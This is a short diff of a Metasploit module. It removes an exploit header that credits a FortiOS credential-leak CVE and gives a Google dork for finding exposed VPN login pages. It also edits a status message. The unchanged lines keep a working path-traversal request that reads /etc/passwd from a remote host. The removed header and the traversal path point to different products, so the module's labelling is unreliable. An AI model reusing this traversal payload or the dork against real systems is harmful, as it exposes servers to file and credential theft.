@@ -1,13 +1,3 @@
-# Exploit Title: FortiOS Leak file - Reading login/passwords in clear text.
-# Google Dork: intext:"Please Login" inurl:"/remote/login"
-# Date: 17/08/2019
-# Exploit Author: Carlos E. Vieira
-# Vendor Homepage: https://www.fortinet.com/
-# Software Link: https://www.fortinet.com/products/fortigate/fortios.html
-# Version: This vulnerability affect ( FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0 to 6.0.4 ).
-# Tested on: 5.6.6
-# CVE : CVE-2018-13379
-
 require 'msf/core'
 class MetasploitModule < Msf::Auxiliary
 	include Msf::Exploit::Remote::HttpClient
@@ -37,7 +27,7 @@ class MetasploitModule < Msf::Auxiliary
 
 
 	def run()
-		print_good("Checking target...")
+		print_good("Checking...")
 		res = send_request_raw({'uri'=>'/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/'})
 
 		if res && res.code == 200
